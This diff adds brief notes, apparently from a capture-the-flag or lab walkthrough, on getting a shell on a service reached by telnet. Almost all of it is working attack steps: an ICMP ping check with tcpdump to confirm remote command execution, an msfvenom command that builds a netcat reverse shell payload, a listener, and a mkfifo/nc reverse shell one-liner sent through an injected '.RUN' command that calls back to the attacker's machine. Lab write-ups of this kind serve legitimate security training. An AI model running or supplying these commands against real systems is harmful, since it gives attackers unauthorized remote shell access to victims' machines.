@@ -1,0 +1,18 @@
+telnet 10.113.168.181 8012
+
+─(kali㉿kali)-[~]
+sudo tcpdump ip proto \\icmp -i tun0
+
+.RUN ping 192.168.139.153 -c 1
+
+We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
+
+"msfvenom -p cmd/unix/reverse_netcat lhost=192.168.139.153 lport=4444 R"
+
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+
+nc -lnvp 4444 
+.RUN mkfifo /tmp/rrobcfw; nc 192.168.139.153 4444 0</tmp/rrobcfw | /bin/sh >/tmp/rrobcfw 2>&1; rm /tmp/rrobcfw
